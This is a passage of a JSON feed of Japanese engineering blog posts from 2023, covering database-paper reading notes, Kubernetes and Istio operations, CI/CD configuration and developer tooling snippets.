17作業時間read23:1123:11author27:093:58summary60:1232:57","isoDate":"2023-04-24T02:23:54.000Z","dateMiliSeconds":1682303034000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"RDBでの結合手法を比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/10_join_method_comparison","contentSnippet":"この記事の趣旨2016年に発表された\\"An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory\\"という論文を読みました。様々な結合手法を包括的に比較した論文でどのような結合方法がどのような時に適しているかを示しています。An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory著者についてStefan Schuh、Xiao Chen、Jens Dittrichのグループによる論文。いずれもDBMSや分析システム、Hadoopなどにおける検索高速化・最適化の研究を行なっている。問題意識関係結合はほとんど全てのクエリプランにおいて中核をなす処理であり、定期的に研究・改良され再検討されてきた。新たな手法が提案され実験を行なわれるものの、それぞれ結果において比較を困難にする要素や幾らかの矛盾を孕んでいた。例えば同じハッシュベースの結合アルゴリズムの比較でも実装が異なったり、複数の論文でパフォーマンス比較で正反対の結果を示しているためである。そのため単純に論文執筆時点で最も高速な結合アルゴリズムを結論づけることが困難であった。手法本論文では結合方法を以下の3つに分類した1. パーティションベースハッシュジョインパーティションに分割し結合する手法。ハッシュテーブルの構築と結合されるデータの探索のキャッシュミスを最小にする事を目的としている。非パーティションベースハッシュジョインパーティションテーブルを構築しながら結合を行なう手法で、マルチスレッドと順番に依存しない実行によりキャッシュミスのパフォーマンス劣化を隠蔽している。ソートマージジョインSIMDによりベクトル化される。検証ではこれらの結合方法を以下の3つのテストで使用するために、全部で13のアルゴリズムを検証している。1. ブラックボックス比較ブラックボックス的に比較する。ホワイトボックス比較ブラックボックス比較で検証する結合方法に先行研究で示された最適化を施した上で比較を行なう。パラレルラディックスジョイン比較Table 2結果パーティション結合の一種であるリモート書込みを排除したCPR系アルゴリズムは小さな入力に対して有効ではないスケールの大きい結合ではとくに理由が無い場合、パーティションベースのジョインを利用する大きなサイズのページを利用するソフトウェアライトコンバインバッファ()を利用するパーティションジョインでは適切なパーティションビットを利用するできるかぎりシンプルなアルゴリズムを利用するNUMAを考慮したアルゴリズムを利用する実行時間とクエリ時間は同一ではない作業時間read31:3431:34author35:183:46summary77:5042:32","isoDate":"2023-04-23T14:16:28.000Z","dateMiliSeconds":1682259388000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"コンパイルとベクトル化による最適化のパフォーマンスを比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/9_compile_vs_vectorize_performance","contentSnippet":"この記事の趣旨2018年に発表された\\"Everything You Always Wanted to Know AboutCompiled and Vectorized Queries But Were Afraid to Ask\\"という論文を読みました。最新のクエリエンジンの特性をまとめ、どのようなワークロードに向くのかという指針を示すないようです。Everything You Always Wanted to Know About Compiled and Vectorized Queries But Were Afraid to AskTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Boncz著者についてTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Bonczのグループによる論文。いずれも大規模データにおけるクエリパフォーマスや最適化に関する研究を行なっている。問題意識分析ワークロードに向いた最新のクエリエンジンはベクトル化またはデータ中心のコード生成に基づいている。どちらのモデルも従来のエンジンに比べオーバーヘッドが少く、非常に効率的なものの概念的には大きく異なっている。この2つのモデルの違いは、DBMSの実行エンジンのソースコードの構成とその性能特性を決定する基本的なもので、クエリ実行モデルを超える多くの設計で異なる。本論文はことなる2つのモデルを再実装し、環境差異のないマシンで実行することでそれぞれのモデルがどのように違うのか。どのような用途に最適なのかを検証している。手法検証手法は著者らがC++で再実装したデータ中心モデルの「Taper」とベクトル化中心の「Tectorwise」を同一のマシンでパフォーマンス検証を行っている。検証項目は以下から成る1. インメモリOLAPワークロードでのマイクロアーキテクチャ分析1. SIMDの利点の検証1. マルチコアCPUにおけるクエリ並列化1. 異なるハードウェアでのパフォーマンス結果インメモリOLAPワークロードでのマイクロアーキテクチャ分析Figure 3: Performance – TPC-H SF=1, 1 threadSIMDの利点の検証SIMDを評価するにはTectorwiseのみを用いた。SIMDではスカラーなデータをベクトルに変換するペナルティは少く、最大8.4倍の性能向上が確認された。Figure 6: Scalar vs. SIMD Selection in TectorwiseマルチコアCPUにおけるクエリ並列化異なるハードウェアでのパフォーマンスIntel Skylake、Intel Knights Landing、AMD Ryzenで対照実験を行なったものの、いずれのハードウェアでもTyper、Tectorwiseともに有効に動作した。作業時間read29:2629:26author33:233:57summary76:3742:44感想VoectorwiseとHyperのいずれを使うべきか。どちらが優れているかといった疑問に答えるないようだった。","isoDate":"2023-04-21T01:45:06.000Z","dateMiliSeconds":1682041506000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Renovateをローカルで動かす","link":"https://kechigon.hatenablog.com/entry/2023/04/20/140449","contentSnippet":"Renovateには様々な実行方法がありますが。ここではローカルで動かす方法について説明します。Renovateをクローンするhttps://github.com/renovatebot/renovateからクローンしましょう。これ以降はクローンしたリポジトリのルートディレクトリで作業します。実行環境コンテナ.devcontainer/Dockerfileをビルドします。docker build -f .devcontainer/Dockerfile -t renovatebot_local .Renovateの依存パッケージをインストールdocker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app renovatebot_local yarnローカル実行時のオプションドキュメントを参考に、引数を与えてください。ログレベルdebugでGitLabリポジトリに対して実行する場合は、以下のようになります。例：docker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app -e LOG_LEVEL=debug -e GITHUB_COM_TOKEN=*** renovatebot_local yarn start --platform gitlab --token *** {リポジトリ}※{リポジトリ}のところはユーザー名/リポジトリ名のような感じです。","isoDate":"2023-04-20T05:04:49.000Z","dateMiliSeconds":1681967089000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/8_counter_control_flow_divergence_in_compiled_query_pipelines","contentSnippet":"この記事の趣旨2020年に提案された\\"Make the most out of your SIMD investments: counter control flowdivergence in compiled query pipelines\\"という論文を読みました。SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文です。Make the most out of your SIMD investments: counter control flow divergence in compiled query pipelinesHarald Lang, Linnea Passing, Andreas Kipf, Peter Boncz, Thomas Neumann, Alfons Kemper著者についてHarald Lang、 Linnea Passing、 Andreas Kipf、 Peter Boncz、 Thomas Neumann、 Alfons Kemperのグループによる研究いずれも最新のアーキテクチャでのクエリ最適化やデータ分析における検索手法などを研究している。問題意識CPUの発展にともないあたらしいCPUアーキテクチャが登場した。Single Instruction Multiple Data(SIMD)ではRDBはSIMDによるベクトル処理能力の向上により、クエリコンパイラの実行パイプライン全体をベクトル化して高度なデータ並列性の恩恵を受けることが出来るようになった。一方でクエリ全体をベクトル化して実行することで、SIMDによるクエリ評価が忙しくなる。SIMD評価で結果に寄与しない評価が単純にオーバーヘッドとなってしまう。手法本論文ではリフィルアルゴリズムとそのアルゴリズムをクエリパイプラインプランに統合する手法で上記の問題の解決を試みている。リフィルアルゴリズムは基本的に新しい要素を宛先レジスタの希望する位置にコピーするアルゴリズムで、メモリからレジスタとレジスタからレジスタへのコピーの2パターンが存在する。クエリパイプラインプランに統合するリフィル戦略ではConsume EverythingパターンとPartial Consumeパターンが存在する。Consum Everything戦略は、タプルをバッファリングするために使用される追加のベクターレジスタを割り当てる方法で利用率が低い場合、オペレータはこれらのタプルの処理を延期する。つまり、この反復ではボディは実行されず(条件が満たされない場合)、代わりにアクティブなタプルがこれらのバッファレジスタに移動することになる。Partial Consume戦略ではconsume()コードを入力の一部に適用する方法で、制御フローを前のオペレータに戻し、アクティブなデータ断片のみをベクトルレジスタに残すことで実行を延期している。作業時間read29:4029:40author33:404:00summary60:0426:36感想前回に引続き個人的には難しいと感じる論文だった。2000年前後の提案にくらべ、2015年前後の論文ではハードウェアアーキテクチャを中心とした手法がピックアップされている。単純に自分の知識不足、理解力不足なので勉強するしかない。","isoDate":"2023-04-20T02:00:20.000Z","dateMiliSeconds":1681956020000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"NUMAアーキテクチャでのクエリ最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/7_numa_aware_query_evaluation_framework","contentSnippet":"この記事の趣旨\\"Morsel-Driven Parallelism: A NUMA-Aware Query Evaluation Framework forthe Many-Core Age\\"という2014年に発表された、多コアサーバにおけるクエリ最適化手法をあつかった論文を読みました。[Morsel-Driven Parallelism: A NUMA-Aware QueryEvaluation Framework for the Many-Core Age](https://15721.courses.cs.cmu.edu/spring2023/papers/07-scheduling/p743-leis.pdf)Viktor Leis, Peter Boncz, Alfons Kemper, Thomas Neumann著者についてViktor Leis、 Peter Boncz、 Alfons Kemper、Thomas Neumannのグループによる研究いずれもデータベースと 高速化かを中心に研究している。問題意識コンピュータアーキテクチャの進化にともない、二つのあたらしい問題が生じた。多コアを利用するためにクエリを数百のスレッドに均等に分散させるそれをNUMA(Non-Uniform Memory Access)による順序通りではないメモリアクセスで実現する必要がある。これらの要因からplanベースの並列処理による不可分散とコンテキストスイッチとボトルネックが問題になりスケールが難しかった。NUMAによってデータとアクセススレッドがどのチップに配置されるかによって、データ項目のアクセスコストが異なるため、コンピュータ自体がネットワークになっており、多コア並列化では、RAMやキャッシュ階層を考慮する必要がある。この論文ではMoral-drivenクエリ実行フレームワークを提案している。手法提案手法は並列クエリ処理のため、morselドリブンクエリ評価フレームワークを提示した。これはメニーコア時代の分析クエリ性能の主要なボトルネックである負荷分散、スレッド同期、メモリアクセス局所性およびリソース弾力性を解決することを目的としている。ベースとなるアイデアは以下の2つに分けられる。メモリ上のデータをmorselと呼ばれる小さなバッチに分割し、バッチごとに処理を実行したあとにそれぞれの処理結果をグローバルハッシュテーブルとしてまとめる。Figure 3: NUMA-aware processing of the build-phaseディスパッチャと呼ばれる並行パイプライン制御を行ない、ワーカースレッドをタスクに割り当てるFigure 5: Dispatcher assigns pipeline-jobs on morsels to threads depending on the coreまとめとして著者はきめ細かいスケジューリング、完全演算子並列化、低オーバーヘッド同期、NUMA対応スケジューリングの原理を用いて、他のシステムでもメニーコアスケーリングを改善できると示唆している。作業時間read28:3628:36author32:453:09summary60:3727:52感想近現代のサーバアーキテクチャで主流になっているNUMAでのクエリパフォーマンス向上のための論文のため、古典的なものに比べ概念が難しいものが多い。もう少し理解を深めたい。","isoDate":"2023-04-18T01:01:35.000Z","dateMiliSeconds":1681779695000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"おうちk8sクラスターを構築していて詰まったところ","link":"https://kechigon.hatenablog.com/entry/2023/04/17/174444","contentSnippet":"おうち Kubernetes インターンを参考に機材調達->OSインストール->kubeadamでクラスター構築と一通りやってみたので、トラブったところと解決策を共有します。USBメモリRaspberry PiにOSをインストールする際に、SDカードの性能が悪いと失敗します。私は安物で済ませようとした結果、三枚目でようやく成功しました。またインストール後も、ディスクの読み書き速度は全体のパフォーマンスに影響を与えるので、性能にはこだわるべきです。以下のサイトなどを参考に選びましょう。https://www.kingston.com/jp/blog/personal-storage/memory-card-speed-classeshttps://osusumepc.com/raspberry-pi-microsd/cgroups の Memory Subsystem を有効化私がインストールしたOSでは、cgroups の Memory Subsystem がデフォルトで無効化されているため、/boot/firmware/cmdline.txtに下記を追加する必要がありました。cgroup_memory=1 cgroup_enable=memoryしかし、編集し再起動しても有効化されませんでした。原因は改行を入れて追加していたことでした。改行せず行末に追加するのが正しいです。","isoDate":"2023-04-17T08:44:44.000Z","dateMiliSeconds":1681721084000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"コンテナイメージのマルウェア検出とその実用性について","link":"https://speakerdeck.com/kyohmizu/kontenaimezinomaruueajian-chu-tosonoshi-yong-xing-nituite","contentSnippet":"3-shake SRE Tech Talk #5 ~ コンテナセキュリティ最前線 の資料です。\\rhttps://3-shake.connpass.com/event/277945/","isoDate":"2023-04-12T04:00:00.000Z","dateMiliSeconds":1681272000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetes の Probe の仕組みと考慮点","link":"https://zenn.dev/toversus/articles/5d1292160f5035","contentSnippet":"!Kubernetes 1.26 時点の話で、以降のマイナーバージョンで改善されている可能性があります。Kubernetes には、ワークロードの正常性を確認するための Probe という仕組みがあり、Liveness / Readiness / Startup Probe が用意されています。kubelet (Kubernetes のノード上で動作するエージェント) は、ワークロードに対して TCP Socket / HTTP GET / gRPC / Exec の中から指定されたチェックを定期的に実行します。それぞれの Probe の特性を理解して使い分けないとサービスに影響...","isoDate":"2023-04-10T02:20:29.000Z","dateMiliSeconds":1681093229000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitLab CI で artifacts:reports:dotenv を使って Job をまたいで変数を渡す","link":"https://blog.1q77.com/2023/04/gitlab-ci-artifacts-report-dotenv/","contentSnippet":"GitLab CI である Job で変数を定義して、それを後続の Job でも使いたいなと思って調べていたらartifacts:reports:dotenv にたどり着いたのでメモ。使用例stages: - stage1 - stage2 - stage3 - stage4job1: stage: stage1 script: - echo \\"MY_VAR1=first-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env# job1 と job2 で使用するファイル名が重複しても別物なので問題ないjob2: stage: stage2 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=second-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env needs: - job: job1 artifacts: true# needs で指定しているので MY_VAR1 も MY_VAR2 も渡されるjob3_1: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true - job: job2 artifacts: true# needs で job1 だけを指定しているので MY_VAR1 だけ渡されるjob3_2: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true# needs を指定しないと MY_VAR1 も MY_VAR2 も両方渡されるjob3_3: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\"# needs で job1 が指定されているが artifacts は false なので# MY_VAR1 も MY_VAR2 も渡されないjob3_4: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false# MY_VAR2 だけ受け取れるjob3_5: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false - job: job2 artifacts: truehttps://gitlab.com/gitlab-org/gitlab/-/issues/22638","isoDate":"2023-04-04T16:27:22.000Z","dateMiliSeconds":1680625642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Orbstack を Docker Desktop の代わりに使う","link":"https://blog.1q77.com/2023/04/orbstack/","contentSnippet":"きっかけbrew update して新しく追加された formula を眺めるのが最近のちょっとした楽しみ— yteraoka (@yteraoka) January 12, 2023で、orbstack っていう formula が追加されてるのを見てほー、そんなものが、ということで試してみる。","isoDate":"2023-04-04T13:17:51.000Z","dateMiliSeconds":1680614271000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy の externalTrafficPolicy=Local の改善","link":"https://zenn.dev/toversus/articles/6eeb3b708bdff3","contentSnippet":"tl;dr;Service type LoadBalancer の externalTrafficPolicy: Local は、Kubernetes 1.26 まで Pod のローリング更新時にトラフィックが喪失する問題があるので注意kubernetes-sigs/cloud-provider-kind は、ローカル環境でクラウドリソース (現在は LB のみ) が絡む処理をシミュレートできて便利GKE Dataplane v2 を利用している場合、GKE 1.26.1 時点で Cilium に externalTrafficPolicy: Local の改善が入ってい...","isoDate":"2023-03-29T01:31:20.000Z","dateMiliSeconds":1680053480000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"PagerDuty で一定期間アラートを抑制する","link":"https://zenn.dev/toshikish/articles/6958af565e6c65","contentSnippet":"PagerDuty でアラートを受け取っているプロジェクトで，以下のようにある時間帯はアラートを止めたいケースがあります。メンテナンスが予定されている。開発環境は営業時間内だけ動かすので，平日夜や土日祝日は止めたい。何も対策しないとアラートが鳴ってしまい，オンコール担当者を不用意に呼び出す結果になるので，そうならないようにきちんと設定します。 TL;DR各ケースで以下のように設定します。メンテナンス→メンテナンスウィンドウを設定平日夜・土日停止→曜日・時刻ベースのイベントルールを追加 方法1：メンテナンスウィンドウメンテナンスなどでダウンする時間帯があらかじ...","isoDate":"2023-03-27T08:38:39.000Z","dateMiliSeconds":1679906319000,"authorName":"toshikish","authorId":"toshikish"},{"title":"jq commandの select でハマった話","link":"https://zenn.dev/satohjohn/articles/79faafa55e9a1e","contentSnippet":"結論配列のjsonに対してselectする際には、配列を一度オブジェクトの抽出をしないと複製されてしまう。なので、以下ではなくjq -r  \'select(.[].A | contains(\\"特定文字列\\")) | .[].B\' test.jsonこうしないといけないjq -r  \'.[] | select(.A | contains(\\"特定文字列\\")) | .B\' test.json 環境$ jq --version   jq-1.6 詰まった内容以下のjson(test.json)があったときにtest.json[    {        \\"hog...","isoDate":"2023-03-25T16:36:44.000Z","dateMiliSeconds":1679762204000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetes と名前解決","link":"https://zenn.dev/toversus/articles/d9faba80f68ea2","contentSnippet":"tl;dr外部サービスのホスト名の末尾に . (ドット) を必ず指定しましょう。✅\xa0google.com.❌\xa0google.com末尾にドットを指定できない (e.g. SDK 組み込み) かつ大量の名前解決が発生している場合は、Pod の DNS Config の options で ndots: 1 を指定しましょう。Kubernetes の名前解決の仕組みを理解していないと、各ノードの conntrack テーブルが溢れてパケットが破棄され、サービスに影響が出ることがあります。 背景アプリケーションが外部のサービスを呼び出す場合、ホスト名を IP アド...","isoDate":"2023-03-22T07:36:38.000Z","dateMiliSeconds":1679470598000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"cloud runの要らなくなったリビジョンを消す","link":"https://zenn.dev/satohjohn/articles/2a769b8280427d","contentSnippet":"小ネタです。運用をしていて、たくさんリリースしているとリビジョンが増えていることとかもあるかなと思いますが、コンソール上から消すのも面倒なので、コマンドで消しましょう。というか、解説することもないので、結論と詰まった部分だけ残しておきます。 結論 ACTIVEじゃないものをすべて消す#!/bin/bashSERVICE_NAME=$1revisions=$(    gcloud run revisions list --service=$SERVICE_NAME \\\\    --filter=\\"status.conditions.type:Active AND s...","isoDate":"2023-03-21T02:35:43.000Z","dateMiliSeconds":1679366143000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Datadog Agent からの Metrics を Victoria Metrics で受ける","link":"https://blog.1q77.com/2023/03/send-datadog-metrics-to-victoriametrics/","contentSnippet":"Victoria Metrics は v1.67.0 で Datadog Agent からのメトリクスを受け取れるようになっているので今回はこれを試してみる。Victoria Metrics のドキュメント How to send data from DataDog agentSingle node Instance をセットアップVictoria Metrics はクラスタリング構成も可能だが今回は Single node のサーバーで検証。","isoDate":"2023-03-19T12:38:04.000Z","dateMiliSeconds":1679229484000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Azure Bicep で Storage Account の SSE を設定する","link":"https://zenn.dev/kyohei_saito/articles/fb102fd2af31e2","contentSnippet":"Azure Bicep で Storage Account の SSE (サーバー側暗号化) を設定してみようとしたところ、思ったより難しかったのと、やりたいことそのままのサンプルコードがなかったため、調査した内容を公開してみます。 この記事で書いてあることAzure Bicep を使用して Storage Account の SSE を設定する方法 サンプルコード早く使い方とコードを見たい、という方向けにまずはサンプル コードについて記載します。この記事で説明するサンプル コードの全体は下記を参照ください。https://github.com/kiyo-s/crea...","isoDate":"2023-03-19T04:44:58.000Z","dateMiliSeconds":1679201098000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"k8s.gcr.io の凍結対応から学んだことメモ","link":"https://zenn.dev/kyohei_saito/articles/d0080d94dae0b7","contentSnippet":"今まで Kubernetes プロジェクトのコンテナ イメージをホストしていたイメージ レジストリ k8s.gcr.io が凍結されることが発表されました。この記事では、k8s.gcr.io から registry.k8s.io に移行する過程で学んだことについて、備忘としてメモします。 この記事で書いてあることk8s.gcr.io から registry.k8s.io に移行した流れhelm で、dependencies によって外部の chart を install している場合に、外部の chart の values を設定する方法skopeo によりローカルで ...","isoDate":"2023-03-18T19:08:14.000Z","dateMiliSeconds":1679166494000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Terraform] aws_networkfirewall_firewall リソースから VPC エンドポイント ID を取り出す","link":"https://zenn.dev/toshikish/articles/fc08c2021811f9","contentSnippet":"はじめにTerraform を使って AWS Network Firewall のファイアウォールを作るとき，生成された VPC エンドポイントの ID をサブネットのルートテーブルのルートに追加するのは自然な流れですが，VPC エンドポイント ID を取り出すのが大変だったので，やり方を記録しておきます。例えば以下のように aws_networkfirewall_firewall リソースを定義したとします。（特に説明のない変数やリソースは，なんとなくの理解で構いません。）resource \\"aws_networkfirewall_firewall\\" \\"firewall\\" ...","isoDate":"2023-03-16T07:58:23.000Z","dateMiliSeconds":1678953503000,"authorName":"toshikish","authorId":"toshikish"},{"title":"振り返り (2020 - 2022)","link":"https://zenn.dev/toversus/articles/8557a7fb2bc15c","contentSnippet":"コロプラに 2020/3/1 に入社して、2023/2/28 付けで退職したので、丸々 3 年間勤務したことになります。本当の意味での大規模 Kubernetes 環境で貴重な経験をさせて貰い感謝しかないです。記憶が新しい内に、この 3 年間でやってきたことを公開できる範囲で整理しました。 GitOps 風なマニフェスト管理への移行インフラチームで管理している監視ツールやアドオンなコンポーネントを Helm でインストールしていました。マルチクラスタな環境で手動インストールはスケールしないので、Helmfile で生成した各クラスタのマニフェストを Argo CD で同期する方式に...","isoDate":"2023-03-05T14:17:49.000Z","dateMiliSeconds":1678025869000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"放送コンテンツに対する ツイートの＜一様率＞分析","link":"https://speakerdeck.com/ota1022/fang-song-kontentunidui-suru-tuitono-yang-lu-fen-xi","contentSnippet":"DEIM2023 Day1 4a-3-2にて発表したスライドです。\\rhttps://event.dbsj.org/deim2023/","isoDate":"2023-03-05T05:00:00.000Z","dateMiliSeconds":1677992400000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Devbox を使った開発環境","link":"https://blog.1q77.com/2023/03/devbox/","contentSnippet":"ローカル環境を汚さずDockerコンテナのオーバーヘッドもなく、開発環境を自在に構築できる「Devbox 0.2.0」登場 － Publickeyこの記事を最初に見たときは「えーそんなのコンテナじゃないじゃん」とか思って不要じゃね？って思ってたんですが、Rails を少し触ることになって macOS 上での docker の遅さに辟易してきたので devbox を思い出し、使ってみることにしました。","isoDate":"2023-03-04T15:05:12.000Z","dateMiliSeconds":1677942312000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"ChatGPTのアルゴリズム","link":"https://speakerdeck.com/yunosukey/chatgptnoarukorisumu","contentSnippet":"ニューラルネット系自然言語処理の歴史を、アルゴリズムも紹介しながら単純パーセプトロンからChatGPTに至るまで辿る","isoDate":"2023-03-03T05:00:00.000Z","dateMiliSeconds":1677819600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【Istio⛵️】Istioを安全にアップグレードするカナリア方式とその仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/02/26/202548","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのアップグレード手法の種類について安全なカナリア方式の仕組みについてこの記事から得られる知識01. はじめに02. なぜ安全なアップグレードが必要なのか起こりうる問題採用するべきアップグレード手法03. アップグレード手法を説明する前にカナリアリリースとはカナリアリリースの手順(1) 新環境のリリース(2) 新環境への重み付けルーティング(3) 実地的テストの実施(4) 重み付けの段階的変更『カナリアリリース』の呼称の由来04. アップグレード手法の概要(1) アップグレード前の検証(2) 新Istiodのインストール(3) Webhookの宛先のServiceの変更(4) Istio IngressGatewayをインプレースアップグレード(5) 一部のNamespaceのistio-proxyコンテナをアップグレード(6) ユーザの手を借りたテスト(7) istio-proxyコンテナの段階的アップグレード(8) 旧Istiodのアンインストール05. アップグレード手法の詳細istioctl コマンドを使用したアップグレード前提NamespaceIstiodIstio IngressGatewayマイクロサービス(1) アップグレード前の検証ここで実施することistioctl x precheckコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration(2) 新Istiodのインストールここで実施することistioctl versionコマンドistioctl installコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration(3) Webhookの宛先のServiceの変更ここで実施することistioctl tag setコマンド(4) Istio IngressGatewayをインプレースアップグレードここで実施することkubectl rollout restartコマンド(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施することkubectl rollout restartコマンド(6) ユーザの手を借りたテストここで実施することもし問題が起こった場合(7) istio-proxyコンテナの段階的アップグレードここで実施することkubectl rollout restartコマンド(8) 旧Istiodのアンインストールここで実施することistioctl uninstallコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration06. おわりに記事関連のおすすめ書籍01. はじめに隠しません。有吉弘行のサンデーナイトドリーマー は人生のバイブルです。さて、最近の業務でIstio⛵️をひたすらアップグレードしています。今回は、採用したアップグレード手法の紹介も兼ねて、Istioの安全なアップグレード手法の仕組みを記事で解説しました。Istioのアップグレード手法には変遷があり、解説するのは執筆時点 (2023/02/26) で最新の 1.14 系のアップグレード手法です。それでは、もりもり布教していきます\uD83D\uDE1702. なぜ安全なアップグレードが必要なのか起こりうる問題そもそも、なぜIstioで安全なアップグレードを採用する必要があるのでしょうか。Istioで問題が起こると、Pod内のistio-proxyコンテナが正しく稼働せず、システムに大きな影響を与える可能性があります。例えば、istio-proxyコンテナのPodへのインジェクションがずっと完了せず、アプリコンテナへの通信が全て遮断されるといったことが起こることがあります。採用するべきアップグレード手法執筆時点 (2023/02/26) では、Istiodコントロールプレーン (以降、Istiodとします) のアップグレード手法には、『インプレース方式』と『カナリア方式』があります。また合わせてアップグレードが必要なIstio IngressGatewayには、その手法に『インプレース方式』があります。今回の安全なアップグレード手法として、Istiodでは『カナリアアップグレード』、Istio IngressGatewayでは『インプレースアップグレード』を採用します。Istio / Canary UpgradesIstio / Installing Gateways03. アップグレード手法を説明する前にカナリアリリースとはIstiodのカナリアアップグレードが理解しやすくなるように、カナリアリリースから説明したいと思います。カナリアリリースは、実際のユーザーにテストしてもらいながらリリースする手法です。もしカナリアリリースをご存知の方は、 04. アップグレード手法の概要 まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍カナリアリリースの手順カナリアリリースは、一部のユーザーを犠牲にすることになる一方で、アプリを実地的にテストできる点で優れています。手順を交えながら説明します。Canary Release(1) 新環境のリリース旧環境のアプリを残したまま、新環境をリリースします。この段階では、全てのユーザー (100%) を旧環境にルーティングします。(2) 新環境への重み付けルーティングロードバランサーで重み付けを変更し、一部のユーザー (ここでは10%) を新環境にルーティングします。(3) 実地的テストの実施ユーザーの手を借りて新環境を実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。(4) 重み付けの段階的変更新環境に問題が起こらなければ、重み付けを段階的に変更し、最終的には全てのユーザー (100%) を新環境にルーティングします。『カナリアリリース』の呼称の由来カナリアリリースについては、その呼称の由来を知ると、より理解が深まります。カナリアリリースは、20世紀頃の炭坑労働者の危機察知方法に由来します。炭鉱内には有毒な一酸化炭素が発生する場所がありますが、これは無色無臭なため、気づくことに遅れる可能性があります。そこで当時の炭鉱労働者は、一酸化炭素に敏感な『カナリア』を炭鉱内に持ち込み、カナリアの様子から一酸化炭素の存在を察知するようにしていたそうです。つまり、先ほどの『犠牲になる一部のユーザー』が、ここでいうカナリアというわけです\uD83D\uDE28画像引用元：George McCaa, U.S. Bureau of MinesAbout canary deployment in simple words04. アップグレード手法の概要カナリアリリースを理解したところで、Istioの安全なアップグレード手法の概要を説明します。おおよそ以下の手順からなります。なお各番号は、05. アップグレード手法の詳細 の (1) 〜 (8) に対応しています。(1) アップグレード前の検証旧Istiodが稼働しています。ここで、アップグレードが可能かどうかを検証しておきます。(2) 新Istiodのインストール新Istiod (discoveryコンテナ) をインストールします。(3) Webhookの宛先のServiceの変更新Istiodのistio-proxyコンテナをインジェクションできるように、Webhookの宛先のServiceを変更します。この手順は重要で、後の  (3) Webhookの宛先のServiceの変更 で詳細を説明しています。(4) Istio IngressGatewayをインプレースアップグレードIstio IngressGatewayをインプレースアップグレードします。(5) 一部のNamespaceのistio-proxyコンテナをアップグレード一部のNamespaceで、istio-proxyコンテナをカナリアアップグレードします。▶︎ 『カナリアアップグレード』の呼称についてistio-proxyコンテナを一斉にアップグレードするのではなく、段階的にアップグレードしていく様子を『カナリア』と呼称している、と個人的に推測しています。もし『カナリアアップグレード』の由来をご存じの方は、ぜひ教えていただけると\uD83D\uDE47\uD83C\uDFFB‍(6) ユーザの手を借りたテストユーザーの手を借りて、実地的にテストします (例：該当のエラーメトリクスが基準値以下を満たすか) 。(7) istio-proxyコンテナの段階的アップグレード新Istiodのistio-proxyコンテナに問題が起こらなければ、他のNamespaceでもistio-proxyコンテナを段階的にカナリアアップグレードしていきます。一方でもし問題が起これば、Namespaceのistio-proxyコンテナとIstio IngressGatewayをダウングレードします。(8) 旧Istiodのアンインストール最後に、旧Istiodをアンインストールします。Istio / Canary Upgrades05. アップグレード手法の詳細istioctl コマンドを使用したアップグレードここからは、04. アップグレード手法の概要 